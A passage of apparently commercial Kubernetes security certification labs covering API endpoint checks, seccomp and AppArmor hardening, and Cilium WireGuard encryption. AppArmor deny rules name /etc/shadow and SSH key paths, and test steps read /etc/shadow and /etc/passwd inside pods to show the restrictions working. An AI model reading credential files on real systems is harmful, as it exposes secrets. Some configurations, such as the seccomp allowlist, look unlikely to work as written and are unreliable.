echo "2. Network Policies:" >> $REPORT_FILE
kubectl get networkpolicy --all-namespaces >> $REPORT_FILE
echo "" >> $REPORT_FILE

echo "3. Security Contexts:" >> $REPORT_FILE
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.spec.securityContext.runAsNonRoot}{"\n"}{end}' | grep -v "^$" >> $REPORT_FILE
echo "" >> $REPORT_FILE

echo "4. Service Accounts:" >> $REPORT_FILE
kubectl get serviceaccounts --all-namespaces >> $REPORT_FILE
echo "" >> $REPORT_FILE

echo "5. RBAC Policies:" >> $REPORT_FILE
kubectl get clusterroles | head -10 >> $REPORT_FILE
echo "" >> $REPORT_FILE

echo "Security report generated: $REPORT_FILE"
cat $REPORT_FILE
EOF

chmod +x generate-security-report.sh
./generate-security-report.sh

Troubleshooting Common Issues
Issue 1: API Server Not Restarting After Configuration Changes

Problem: API server pod doesn't restart after modifying configuration files.

Solution:

# Check API server pod status
kubectl get pods -n kube-system | grep apiserver

# If pod is not restarting, manually delete it
kubectl delete pod -n kube-system $(kubectl get pods -n kube-system | grep apiserver | awk '{print $1}')

# Check kubelet logs for errors
sudo journalctl -u kubelet -f

Issue 2: Network Policies Not Taking Effect

Problem: Network policies are created but not enforcing restrictions.

Solution:

# Verify CNI plugin supports NetworkPolicies
kubectl get nodes -o wide

# Check if network plugin is running
kubectl get pods -n kube-system | grep -E "(calico|weave|flannel)"

# Restart network plugin pods if necessary
kubectl delete pods -n kube-system -l k8s-app=calico-node

Issue 3: DNS Configuration Not Applied

Problem: CoreDNS configuration changes are not taking effect.

Solution:

# Check CoreDNS configuration
kubectl get configmap coredns -n kube-system -o yaml

# Restart CoreDNS deployment
kubectl rollout restart deployment/coredns -n kube-system

# Verify DNS resolution
kubectl exec secure-test-pod -- nslookup kubernetes.default.svc.cluster.local

Cleanup

To clean up the lab environment:

# Remove test pods
kubectl delete pod metadata-test-pod api-test-pod secure-test-pod network-scanner cross-namespace-test --ignore-not-found=true

# Remove test namespace
kubectl delete namespace test-namespace --ignore-not-found=true

# Remove network policies (optional - keep for production)
# kubectl delete networkpolicy block-metadata-endpoint api-server-access-policy -n kube-system

# Remove test scripts
rm -f security-test.sh generate-security-report.sh kubernetes-security-report-*.txt

Conclusion

In this lab, you have successfully implemented comprehensive endpoint security measures for a Kubernetes cluster. Here's what you accomplished:

Key Achievements:

• API Server Security: Configured the Kubernetes API server with access restrictions and network policies to limit connectivity to trusted IP ranges and authorized components.

• Metadata Endpoint Protection: Implemented multiple layers of security to prevent pods from accessing cloud metadata endpoints, including network policies and DNS-level blocking.

• Security Validation: Used various network diagnostic tools to test and verify the effectiveness of implemented security measures.

• Comprehensive Testing: Created automated security tests to validate endpoint security configurations and generate security reports.

Why This Matters:

Securing cluster endpoints is crucial for maintaining the overall security posture of Kubernetes environments. The techniques learned in this lab help prevent:

    Unauthorized access to the Kubernetes API server
    Metadata endpoint attacks that could expose sensitive cloud credentials
    Lateral movement within the cluster network
    Data exfiltration through unsecured network channels

Real-World Applications:

These security measures are essential for:

    Production Kubernetes deployments in cloud environments
    Multi-tenant clusters where workload isolation is critical
    Compliance with security frameworks and regulations
    Protecting against common Kubernetes attack vectors

The skills developed in this lab directly apply to the Certified Kubernetes Security Specialist (CKS) certification and are fundamental for anyone responsible for securing Kubernetes clusters in production environments.

Next Steps:

Consider exploring additional security topics such as:

    Pod Security Standards and admission controllers
    Secrets management and encryption at rest
    Runtime security monitoring and threat detection
    Supply chain security for container images






Lab 12: Kernel Hardening Tools Lab
Objectives

By the end of this lab, students will be able to:

• Understand the fundamentals of kernel hardening in Kubernetes environments • Implement seccomp profiles to restrict system calls for containerized applications • Configure and apply AppArmor profiles to limit process capabilities • Verify that applications comply with security hardening profiles • Troubleshoot common issues related to kernel hardening implementations • Demonstrate practical knowledge of security controls required for CKS certification
Prerequisites

Before starting this lab, students should have:

• Basic understanding of Kubernetes concepts (Pods, Deployments, Services) • Familiarity with Linux command line operations • Knowledge of container security fundamentals • Understanding of YAML configuration files • Basic knowledge of Linux security mechanisms
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes clusters already set up. Simply click Start Lab to access your environment - no need to build your own VM or install additional software.

Your lab environment includes: • Ubuntu 20.04 LTS with Kubernetes 1.28+ • Docker runtime pre-installed • kubectl configured and ready to use • AppArmor utilities pre-installed • Sample applications for testing
Task 1: Understanding and Implementing Seccomp Profiles
Subtask 1.1: Explore Current Seccomp Status

First, let's examine the current seccomp configuration in your cluster.

    Check if seccomp is enabled in your cluster:

kubectl get nodes -o jsonpath='{.items[*].status.nodeInfo.containerRuntimeVersion}'

    Verify seccomp support:

grep -i seccomp /boot/config-$(uname -r)

    Check available seccomp profiles:

ls -la /var/lib/kubelet/seccomp/

Subtask 1.2: Create a Custom Seccomp Profile

    Create a directory for seccomp profiles:

sudo mkdir -p /var/lib/kubelet/seccomp/profiles

    Create a restrictive seccomp profile:

cat << 'EOF' | sudo tee /var/lib/kubelet/seccomp/profiles/restricted-profile.json
{
    "defaultAction": "SCMP_ACT_ERRNO",
    "architectures": [
        "SCMP_ARCH_X86_64",
        "SCMP_ARCH_X86",
        "SCMP_ARCH_X32"
    ],
    "syscalls": [
        {
            "names": [
                "accept",
                "accept4",
                "access",
                "arch_prctl",
                "bind",
                "brk",
                "clone",
                "close",
                "connect",
                "dup",
                "dup2",
                "epoll_create",
                "epoll_ctl",
                "epoll_wait",
                "exit",
                "exit_group",
                "fchdir",
                "fchmod",
                "fchown",
                "fcntl",
                "fstat",
                "fstatfs",
                "futex",
                "getcwd",
                "getdents",
                "getgid",
                "getpeername",
                "getpid",
                "getppid",
                "getrandom",
                "getsockname",
                "getsockopt",
                "getuid",
                "listen",
                "lseek",
                "mmap",
                "mprotect",
                "munmap",
                "nanosleep",
                "open",
                "openat",
                "poll",
                "read",
                "readlink",
                "rt_sigaction",
                "rt_sigprocmask",
                "rt_sigreturn",
                "sched_getaffinity",
                "select",
                "set_robust_list",
                "setsockopt",
                "socket",
                "stat",
                "statfs",
                "write"
            ],
            "action": "SCMP_ACT_ALLOW"
        }
    ]
}
EOF

    Verify the profile was created:

sudo cat /var/lib/kubelet/seccomp/profiles/restricted-profile.json | jq .

Subtask 1.3: Deploy a Pod with Seccomp Profile

    Create a test application without seccomp:

cat << 'EOF' > test-app-no-seccomp.yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-app-no-seccomp
  labels:
    app: test-seccomp
spec:
  containers:
  - name: test-container
    image: nginx:1.21
    ports:
    - containerPort: 80
    command: ["/bin/sh"]
    args: ["-c", "while true; do echo 'Running without seccomp'; sleep 30; done"]
EOF

    Deploy the pod:

kubectl apply -f test-app-no-seccomp.yaml

    Create the same application with seccomp profile:

cat << 'EOF' > test-app-with-seccomp.yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-app-with-seccomp
  labels:
    app: test-seccomp
  annotations:
    seccomp.security.alpha.kubernetes.io/pod: localhost/restricted-profile.json
spec:
  containers:
  - name: test-container
    image: nginx:1.21
    ports:
    - containerPort: 80
    command: ["/bin/sh"]
    args: ["-c", "while true; do echo 'Running with seccomp'; sleep 30; done"]
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: restricted-profile.json
EOF

    Deploy the pod with seccomp:

kubectl apply -f test-app-with-seccomp.yaml

Subtask 1.4: Test Seccomp Restrictions

    Check both pods are running:

kubectl get pods -l app=test-seccomp

    Test system calls on the pod without seccomp:

kubectl exec -it test-app-no-seccomp -- strace -c -f -S name nginx -g 'daemon off;' 2>&1 | head -20

    Test system calls on the pod with seccomp (this should show restrictions):

kubectl exec -it test-app-with-seccomp -- ls /proc/self/status | grep Seccomp

    Verify seccomp is active:

kubectl exec -it test-app-with-seccomp -- cat /proc/self/status | grep -i seccomp

Task 2: Implementing AppArmor Profiles
Subtask 2.1: Check AppArmor Status

    Verify AppArmor is enabled:

sudo aa-status

    Check AppArmor module status:

sudo apparmor_status

    List current AppArmor profiles:

sudo aa-status --enabled

Subtask 2.2: Create a Custom AppArmor Profile

    Create an AppArmor profile for our application:

cat << 'EOF' | sudo tee /etc/apparmor.d/k8s-restricted-app
#include <tunables/global>

profile k8s-restricted-app flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  
  # Allow basic file operations
  /bin/sh ix,
  /bin/dash ix,
  /bin/bash ix,
  /usr/bin/env ix,
  
  # Allow reading from specific directories
  /etc/passwd r,
  /etc/group r,
  /etc/hostname r,
  /etc/hosts r,
  /etc/localtime r,
  /etc/nsswitch.conf r,
  /etc/resolv.conf r,
  
  # Allow access to proc filesystem (limited)
  /proc/*/stat r,
  /proc/*/status r,
  /proc/sys/kernel/hostname r,
  
  # Allow temporary file operations
  /tmp/** rw,
  /var/tmp/** rw,
  
  # Allow network operations
  network inet tcp,
  network inet udp,
  network inet6 tcp,
  network inet6 udp,
  
  # Deny dangerous capabilities
  deny capability sys_admin,
  deny capability sys_module,
  deny capability sys_rawio,
  deny capability sys_ptrace,
  deny capability dac_override,
  
  # Deny access to sensitive files
  deny /etc/shadow r,
  deny /etc/sudoers r,
  deny /root/** rw,
  deny /home/*/.ssh/** rw,
  
  # Allow specific application files
  /usr/share/nginx/** r,
  /var/log/nginx/** w,
  /var/cache/nginx/** rw,
  /run/nginx.pid w,
  
  # Allow stdout/stderr
  /dev/stdout w,
  /dev/stderr w,
}
EOF

    Load the AppArmor profile:

sudo apparmor_parser -r /etc/apparmor.d/k8s-restricted-app

    Verify the profile is loaded:

sudo aa-status | grep k8s-restricted-app

Subtask 2.3: Deploy Pod with AppArmor Profile

    Create a pod without AppArmor:

cat << 'EOF' > test-app-no-apparmor.yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-app-no-apparmor
  labels:
    app: test-apparmor
spec:
  containers:
  - name: test-container
    image: nginx:1.21
    ports:
    - containerPort: 80
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: false
      runAsUser: 0
EOF

    Deploy the pod:

kubectl apply -f test-app-no-apparmor.yaml

    Create a pod with AppArmor profile:

cat << 'EOF' > test-app-with-apparmor.yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-app-with-apparmor
  labels:
    app: test-apparmor
  annotations:
    container.apparmor.security.beta.kubernetes.io/test-container: localhost/k8s-restricted-app
spec:
  containers:
  - name: test-container
    image: nginx:1.21
    ports:
    - containerPort: 80
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: false
      runAsUser: 0
EOF

    Deploy the pod with AppArmor:

kubectl apply -f test-app-with-apparmor.yaml

Subtask 2.4: Test AppArmor Restrictions

    Check both pods are running:

kubectl get pods -l app=test-apparmor

    Test file access on pod without AppArmor:

kubectl exec -it test-app-no-apparmor -- ls -la /etc/shadow
kubectl exec -it test-app-no-apparmor -- cat /etc/passwd

    Test file access on pod with AppArmor (should be restricted):

kubectl exec -it test-app-with-apparmor -- ls -la /etc/shadow
kubectl exec -it test-app-with-apparmor -- cat /etc/passwd

    Verify AppArmor profile is active:

kubectl exec -it test-app-with-apparmor -- cat /proc/self/attr/current

Task 3: Combining Seccomp and AppArmor for Enhanced Security
Subtask 3.1: Create a Hardened Application Deployment

    Create a comprehensive hardened deployment:

cat << 'EOF' > hardened-app-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: hardened-nginx
  labels:
    app: hardened-nginx
spec:
  replicas: 2
  selector:
    matchLabels:
      app: hardened-nginx
  template:
    metadata:
      labels:
        app: hardened-nginx
      annotations:
        container.apparmor.security.beta.kubernetes.io/nginx: localhost/k8s-restricted-app
    spec:
      containers:
      - name: nginx
        image: nginx:1.21
        ports:
        - containerPort: 80
        securityContext:
          allowPrivilegeEscalation: false
          runAsNonRoot: false
          runAsUser: 101
          runAsGroup: 101
          readOnlyRootFilesystem: true
          seccompProfile:
            type: Localhost
            localhostProfile: restricted-profile.json
          capabilities:
            drop:
            - ALL
            add:
            - NET_BIND_SERVICE
        volumeMounts:
        - name: tmp-volume
          mountPath: /tmp
        - name: var-cache-nginx
          mountPath: /var/cache/nginx
        - name: var-run
          mountPath: /var/run
        resources:
          limits:
            memory: "128Mi"
            cpu: "100m"
          requests:
            memory: "64Mi"
            cpu: "50m"
      volumes:
      - name: tmp-volume
        emptyDir: {}
      - name: var-cache-nginx
        emptyDir: {}
      - name: var-run
        emptyDir: {}
EOF

    Deploy the hardened application:

kubectl apply -f hardened-app-deployment.yaml

    Create a service for the hardened application:

cat << 'EOF' > hardened-app-service.yaml
apiVersion: v1
kind: Service
metadata:
  name: hardened-nginx-service
spec:
  selector:
    app: hardened-nginx
  ports:
  - protocol: TCP
    port: 80
    targetPort: 80
  type: ClusterIP
EOF

    Deploy the service:

kubectl apply -f hardened-app-service.yaml

Subtask 3.2: Verify Hardened Application Functionality

    Check deployment status:

kubectl get deployment hardened-nginx
kubectl get pods -l app=hardened-nginx

    Test application functionality:

kubectl run test-client --image=busybox --rm -it --restart=Never -- wget -qO- hardened-nginx-service

    Verify security contexts are applied:

POD_NAME=$(kubectl get pods -l app=hardened-nginx -o jsonpath='{.items[0].metadata.name}')
kubectl exec -it $POD_NAME -- cat /proc/self/status | grep -E "(Uid|Gid|Seccomp)"
kubectl exec -it $POD_NAME -- cat /proc/self/attr/current

Subtask 3.3: Test Security Restrictions

    Test file system restrictions:

kubectl exec -it $POD_NAME -- touch /test-file
kubectl exec -it $POD_NAME -- ls -la /etc/shadow

    Test capability restrictions:

kubectl exec -it $POD_NAME -- ping -c 1 8.8.8.8
kubectl exec -it $POD_NAME -- netstat -tulpn

    Monitor AppArmor violations:

sudo dmesg | grep -i apparmor | tail -10

Task 4: Verification and Monitoring
Subtask 4.1: Create Monitoring Scripts

    Create a security verification script:

cat << 'EOF' > verify-security.sh
#!/bin/bash

echo "=== Kubernetes Security Verification ==="
echo

echo "1. Checking Seccomp profiles:"
ls -la /var/lib/kubelet/seccomp/profiles/
echo

echo "2. Checking AppArmor profiles:"
sudo aa-status | grep k8s-restricted-app
echo

echo "3. Checking hardened pods:"
kubectl get pods -l app=hardened-nginx -o wide
echo

echo "4. Verifying security contexts:"
POD_NAME=$(kubectl get pods -l app=hardened-nginx -o jsonpath='{.items[0].metadata.name}')
if [ ! -z "$POD_NAME" ]; then
    echo "Pod: $POD_NAME"
    kubectl exec -it $POD_NAME -- cat /proc/self/status | grep -E "(Uid|Gid|Seccomp)" || true
    kubectl exec -it $POD_NAME -- cat /proc/self/attr/current || true
fi
echo

echo "5. Checking for security violations:"
sudo dmesg | grep -i "apparmor\|seccomp" | tail -5
echo

echo "=== Verification Complete ==="
EOF

chmod +x verify-security.sh

    Run the verification script:

./verify-security.sh

Subtask 4.2: Performance Impact Assessment

    Create a performance test script:

cat << 'EOF' > performance-test.sh
#!/bin/bash

echo "=== Performance Impact Assessment ==="
echo

echo "Testing hardened application response time:"
for i in {1..5}; do
    echo "Test $i:"
    time kubectl run test-perf-$i --image=busybox --rm --restart=Never -- wget -qO- hardened-nginx-service
    echo
done

echo "=== Performance Test Complete ==="
EOF

chmod +x performance-test.sh

    Run the performance test:

./performance-test.sh

Subtask 4.3: Security Compliance Check

    Create a compliance verification script:

cat << 'EOF' > compliance-check.sh
#!/bin/bash

echo "=== Security Compliance Check ==="
echo

PASS=0
FAIL=0

# Check if seccomp is applied
echo "Checking Seccomp compliance..."
POD_NAME=$(kubectl get pods -l app=hardened-nginx -o jsonpath='{.items[0].metadata.name}')
if kubectl exec -it $POD_NAME -- cat /proc/self/status | grep -q "Seccomp.*2"; then
    echo "✓ Seccomp profile is active"
    ((PASS++))
else
    echo "✗ Seccomp profile is not active"
    ((FAIL++))
fi

# Check if AppArmor is applied
echo "Checking AppArmor compliance..."
if kubectl exec -it $POD_NAME -- cat /proc/self/attr/current | grep -q "k8s-restricted-app"; then
    echo "✓ AppArmor profile is active"
    ((PASS++))
else
    echo "✗ AppArmor profile is not active"
    ((FAIL++))
fi

# Check if running as non-root
echo "Checking user context..."
if kubectl exec -it $POD_NAME -- id | grep -q "uid=101"; then
    echo "✓ Running as non-root user"
    ((PASS++))
else
    echo "✗ Not running as expected non-root user"
    ((FAIL++))
fi

# Check if capabilities are dropped
echo "Checking capability restrictions..."
if kubectl get pod $POD_NAME -o yaml | grep -q "drop.*ALL"; then
    echo "✓ Capabilities properly restricted"
    ((PASS++))
else
    echo "✗ Capabilities not properly restricted"
    ((FAIL++))
fi

echo
echo "=== Compliance Summary ==="
echo "Passed: $PASS"
echo "Failed: $FAIL"
echo "Total Score: $(( PASS * 100 / (PASS + FAIL) ))%"
echo
EOF

chmod +x compliance-check.sh

    Run the compliance check:

./compliance-check.sh

Troubleshooting Common Issues
Issue 1: Seccomp Profile Not Loading

Problem: Pod fails to start with seccomp profile errors.

Solution:

# Check if the profile exists
sudo ls -la /var/lib/kubelet/seccomp/profiles/

# Validate JSON syntax
sudo cat /var/lib/kubelet/seccomp/profiles/restricted-profile.json | jq .

# Check kubelet logs
sudo journalctl -u kubelet | grep seccomp

Issue 2: AppArmor Profile Conflicts

Problem: AppArmor denials preventing application from running.

Solution:

# Check AppArmor logs
sudo dmesg | grep -i apparmor

# Put profile in complain mode for debugging
sudo aa-complain k8s-restricted-app

# Generate profile based on actual usage
sudo aa-genprof /usr/sbin/nginx

Issue 3: Pod Security Context Issues

Problem: Pods failing due to security context restrictions.

Solution:

# Check pod events
kubectl describe pod $POD_NAME

# Verify security context settings
kubectl get pod $POD_NAME -o yaml | grep -A 10 securityContext

# Test with relaxed settings first
kubectl patch deployment hardened-nginx -p '{"spec":{"template":{"spec":{"securityContext":{"runAsNonRoot":false}}}}}'

Cleanup

To clean up the lab environment:

# Delete test pods and deployments
kubectl delete pod test-app-no-seccomp test-app-with-seccomp test-app-no-apparmor test-app-with-apparmor
kubectl delete deployment hardened-nginx
kubectl delete service hardened-nginx-service

# Remove AppArmor profile
sudo aa-disable k8s-restricted-app
sudo rm /etc/apparmor.d/k8s-restricted-app

# Remove seccomp profile
sudo rm /var/lib/kubelet/seccomp/profiles/restricted-profile.json

# Remove scripts
rm -f verify-security.sh performance-test.sh compliance-check.sh
rm -f *.yaml

Conclusion

In this comprehensive lab, you have successfully:

• Implemented seccomp profiles to restrict system calls and reduce the attack surface of containerized applications • Configured AppArmor profiles to enforce mandatory access controls and limit process capabilities • Combined multiple security mechanisms to create a defense-in-depth approach for Kubernetes workloads • Verified security compliance through automated testing and monitoring scripts • Gained practical experience with kernel hardening tools essential for the CKS certification

Why This Matters: Kernel hardening is a critical component of container security that helps prevent privilege escalation attacks, limits the impact of container breakouts, and ensures compliance with security standards. The skills you've developed in this lab are directly applicable to real-world Kubernetes security implementations and are essential for maintaining secure production environments.

Key Takeaways:

    Seccomp profiles provide fine-grained control over system calls
    AppArmor profiles enforce mandatory access controls at the kernel level
    Combining multiple security mechanisms creates robust defense layers
    Regular verification and monitoring ensure ongoing security compliance
    Proper testing helps balance security with application functionality

These kernel hardening techniques form the foundation of advanced Kubernetes security practices and are crucial for anyone pursuing the Certified Kubernetes Security Specialist certification.










Lab 13: Managing Pod-to-Pod Encryption
Objectives

By the end of this lab, you will be able to:

• Deploy and configure Cilium service mesh for Pod-to-Pod encryption • Implement mutual TLS (mTLS) authentication between services • Configure network policies to enforce encrypted communication • Monitor and verify encrypted traffic using Cilium's built-in observability tools • Troubleshoot common encryption and connectivity issues • Understand the security benefits of service mesh encryption
Prerequisites

Before starting this lab, you should have:

• Basic understanding of Kubernetes concepts (Pods, Services, Deployments) • Familiarity with kubectl command-line tool • Knowledge of networking concepts (TCP/IP, TLS/SSL) • Understanding of YAML configuration files • Basic Linux command-line skills
Lab Environment

Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes clusters already set up. Simply click Start Lab to access your environment - no need to build your own VM or install Kubernetes from scratch.

Your lab environment includes: • Ubuntu 22.04 LTS with kubectl pre-installed • A 3-node Kubernetes cluster (1 control plane, 2 worker nodes) • Helm package manager • All necessary networking tools
Task 1: Deploy Cilium Service Mesh
Subtask 1.1: Verify Cluster Status

First, let's ensure your Kubernetes cluster is ready and check the current networking setup.

# Check cluster nodes
kubectl get nodes -o wide

# Verify cluster is ready
kubectl cluster-info

# Check current CNI (Container Network Interface)
kubectl get pods -n kube-system | grep -E "(cilium|calico|flannel|weave)"

Subtask 1.2: Install Cilium CLI

Install the Cilium command-line interface tool to manage Cilium operations.

# Download and install Cilium CLI
CILIUM_CLI_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/cilium-cli/main/stable.txt)
CLI_ARCH=amd64
if [ "$(uname -m)" = "aarch64" ]; then CLI_ARCH=arm64; fi
curl -L --fail --remote-name-all https://github.com/cilium/cilium-cli/releases/download/${CILIUM_CLI_VERSION}/cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}
sha256sum --check cilium-linux-${CLI_ARCH}.tar.gz.sha256sum
sudo tar xzvfC cilium-linux-${CLI_ARCH}.tar.gz /usr/local/bin
rm cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}

# Verify installation
cilium version --client

Subtask 1.3: Install Cilium with Encryption

Deploy Cilium with WireGuard encryption enabled for Pod-to-Pod communication.

# Install Cilium with WireGuard encryption
cilium install \
  --encryption=wireguard \
  --enable-l7-proxy=true \
  --enable-hubble-relay=true \
  --enable-hubble-ui=true

# Wait for Cilium to be ready
cilium status --wait

# Verify Cilium installation
kubectl get pods -n kube-system -l k8s-app=cilium

Subtask 1.4: Enable Hubble Observability

Hubble provides deep visibility into network traffic and security policies.

# Enable Hubble UI for traffic monitoring
cilium hubble enable --ui

# Wait for Hubble to be ready
kubectl wait --for=condition=ready pod -l k8s-app=hubble-ui -n kube-system --timeout=300s

# Verify Hubble installation
kubectl get pods -n kube-system -l k8s-app=hubble-relay
kubectl get pods -n kube-system -l k8s-app=hubble-ui

Task 2: Configure mTLS for Services
Subtask 2.1: Create Test Applications

Deploy sample applications to demonstrate encrypted communication.

# Create a namespace for our test applications
kubectl create namespace secure-apps

# Deploy a web server application
cat << 'EOF' > web-server.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-server
  namespace: secure-apps
  labels:
    app: web-server
spec:
  replicas: 2
  selector:
    matchLabels:
      app: web-server
  template:
    metadata:
      labels:
        app: web-server
    spec:
      containers:
      - name: web-server
        image: nginx:1.21
        ports:
        - containerPort: 80
        resources:
          requests:
            memory: "64Mi"
            cpu: "50m"
          limits:
            memory: "128Mi"
            cpu: "100m"
---
apiVersion: v1
kind: Service
metadata:
  name: web-server-service
  namespace: secure-apps
spec:
  selector:
    app: web-server
  ports:
  - port: 80
    targetPort: 80
  type: ClusterIP
EOF

kubectl apply -f web-server.yaml

# Deploy a client application
cat << 'EOF' > client-app.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: client-app
  namespace: secure-apps
  labels:
    app: client-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: client-app
  template:
    metadata:
      labels:
        app: client-app
    spec:
      containers:
      - name: client-app
        image: curlimages/curl:7.85.0
        command: ["/bin/sh"]
        args: ["-c", "while true; do sleep 30; done"]
        resources:
          requests:
            memory: "32Mi"
            cpu: "25m"
          limits:
            memory: "64Mi"
            cpu: "50m"
EOF

kubectl apply -f client-app.yaml

Subtask 2.2: Verify Application Deployment

# Check if applications are running
kubectl get pods -n secure-apps

# Wait for all pods to be ready
kubectl wait --for=condition=ready pod -l app=web-server -n secure-apps --timeout=300s
kubectl wait --for=condition=ready pod -l app=client-app -n secure-apps --timeout=300s

# Test basic connectivity
CLIENT_POD=$(kubectl get pod -l app=client-app -n secure-apps -o jsonpath='{.items[0].metadata.name}')
kubectl exec -it $CLIENT_POD -n secure-apps -- curl -s http://web-server-service.secure-apps.svc.cluster.local

Subtask 2.3: Configure Network Policies for Encryption

Create Cilium Network Policies to enforce encrypted communication and implement mTLS.

# Create a Cilium Network Policy for encrypted communication
cat << 'EOF' > encryption-policy.yaml
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: secure-web-server-policy
  namespace: secure-apps
spec:
  endpointSelector:
    matchLabels:
      app: web-server
  ingress:
  - fromEndpoints:
    - matchLabels:
        app: client-app
    toPorts:
    - ports:
      - port: "80"
        protocol: TCP
      rules:
        http:
        - method: "GET"
  egress:
  - toEndpoints:
    - matchLabels:
        k8s:io.kubernetes.pod.namespace: kube-system
---
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: secure-client-policy
  namespace: secure-apps
spec:
  endpointSelector:
    matchLabels:
      app: client-app
  egress:
  - toEndpoints:
    - matchLabels:
        app: web-server
    toPorts:
    - ports:
      - port: "80"
        protocol: TCP
  - toEndpoints:
    - matchLabels:
        k8s:io.kubernetes.pod.namespace: kube-system
  - toFQDNs:
    - matchName: "web-server-service.secure-apps.svc.cluster.local"
EOF

kubectl apply -f encryption-policy.yaml

Subtask 2.4: Enable L7 Policy Enforcement

Configure Layer 7 (application layer) policy enforcement for enhanced security.

# Create an L7 policy with authentication requirements
cat << 'EOF' > l7-auth-policy.yaml
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: l7-auth-policy
  namespace: secure-apps
spec:
  endpointSelector:
    matchLabels:
      app: web-server
  ingress:
  - fromEndpoints:
    - matchLabels:
        app: client-app
    toPorts:
    - ports:
      - port: "80"
        protocol: TCP
      rules:
        http:
        - method: "GET"
          path: "/"
        - method: "GET"
          path: "/health"
      terminatingTLS:
        secret:
          name: web-server-tls
          namespace: secure-apps
      originatingTLS:
        secret:
          name: client-tls
          namespace: secure-apps
EOF

# Note: We'll create the TLS secrets in the next subtask

Subtask 2.5: Create TLS Certificates for mTLS

Generate self-signed certificates for mutual TLS authentication.

# Create a directory for certificates
mkdir -p /tmp/certs
cd /tmp/certs

# Generate CA private key
openssl genrsa -out ca-key.pem 4096

# Generate CA certificate
openssl req -new -x509 -days 365 -key ca-key.pem -sha256 -out ca.pem -subj "/C=US/ST=CA/L=San Francisco/O=Lab/CN=Lab CA"

# Generate server private key
openssl genrsa -out server-key.pem 4096

# Generate server certificate signing request
openssl req -subj "/C=US/ST=CA/L=San Francisco/O=Lab/CN=web-server-service.secure-apps.svc.cluster.local" -sha256 -new -key server-key.pem -out server.csr

# Generate server certificate
openssl x509 -req -days 365 -sha256 -in server.csr -CA ca.pem -CAkey ca-key.pem -out server-cert.pem -CAcreateserial

# Generate client private key
openssl genrsa -out client-key.pem 4096

# Generate client certificate signing request
openssl req -subj "/C=US/ST=CA/L=San Francisco/O=Lab/CN=client-app" -sha256 -new -key client-key.pem -out client.csr

# Generate client certificate
openssl x509 -req -days 365 -sha256 -in client.csr -CA ca.pem -CAkey ca-key.pem -out client-cert.pem -CAcreateserial

# Create Kubernetes secrets for TLS certificates
kubectl create secret tls web-server-tls \
  --cert=server-cert.pem \
  --key=server-key.pem \
  -n secure-apps

kubectl create secret tls client-tls \
  --cert=client-cert.pem \
  --key=client-key.pem \
  -n secure-apps

kubectl create secret generic ca-secret \
  --from-file=ca.crt=ca.pem \
  -n secure-apps

# Clean up certificate files
cd ~
rm -rf /tmp/certs

Task 3: Monitor and Verify Encrypted Traffic
Subtask 3.1: Access Hubble UI

Set up port forwarding to access the Hubble UI for traffic monitoring.

# Port forward to Hubble UI
kubectl port-forward -n kube-system svc/hubble-ui 12000:80 &

# Note: The Hubble UI will be available at http://localhost:12000
# In a real environment, you would access this through your browser
echo "Hubble UI is available at http://localhost:12000"
echo "You can access it through your browser to monitor traffic flows"

Subtask 3.2: Monitor Traffic with Hubble CLI

Use Hubble CLI to observe network traffic and verify encryption.

# Install Hubble CLI
HUBBLE_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt)
HUBBLE_ARCH=amd64
if [ "$(uname -m)" = "aarch64" ]; then HUBBLE_ARCH=arm64; fi
curl -L --fail --remote-name-all https://github.com/cilium/hubble/releases/download/$HUBBLE_VERSION/hubble-linux-${HUBBLE_ARCH}.tar.gz{,.sha256sum}
sha256sum --check hubble-linux-${HUBBLE_ARCH}.tar.gz.sha256sum
sudo tar xzvfC hubble-linux-${HUBBLE_ARCH}.tar.gz /usr/local/bin
rm hubble-linux-${HUBBLE_ARCH}.tar.gz{,.sha256sum}

# Port forward to Hubble Relay
kubectl port-forward -n kube-system svc/hubble-relay 4245:80 &

# Wait a moment for port forwarding to establish
sleep 5

# Configure Hubble CLI
export HUBBLE_SERVER=localhost:4245

Subtask 3.3: Generate and Monitor Traffic

Generate traffic between applications and monitor the encrypted communication.

# Generate continuous traffic in the background
CLIENT_POD=$(kubectl get pod -l app=client-app -n secure-apps -o jsonpath='{.items[0].metadata.name}')

# Start traffic generation in background
kubectl exec -it $CLIENT_POD -n secure-apps -- sh -c '
while true; do
  curl -s http://web-server-service.secure-apps.svc.cluster.local > /dev/null
  echo "Request sent at $(date)"
  sleep 5
done' &

TRAFFIC_PID=$!

# Monitor traffic flows
echo "Monitoring traffic flows for 30 seconds..."
timeout 30s hubble observe --namespace secure-apps --follow

# Monitor specific traffic between client and server
echo "Monitoring client-to-server traffic..."
timeout 20s hubble observe --from-pod secure-apps/client-app --to-service secure-apps/web-server-service --follow

# Stop traffic generation
kill $TRAFFIC_PID 2>/dev/null || true

Subtask 3.4: Verify Encryption Status

Check the encryption status and verify that traffic is being encrypted.

# Check Cilium encryption status
cilium status | grep -i encrypt

# Verify WireGuard encryption is active
kubectl exec -n kube-system ds/cilium -- cilium encrypt status

# Check network policies are applied
kubectl get cnp -n secure-apps

# Describe the network policies
kubectl describe cnp secure-web-server-policy -n secure-apps
kubectl describe cnp secure-client-policy -n secure-apps

Subtask 3.5: Test Policy Enforcement

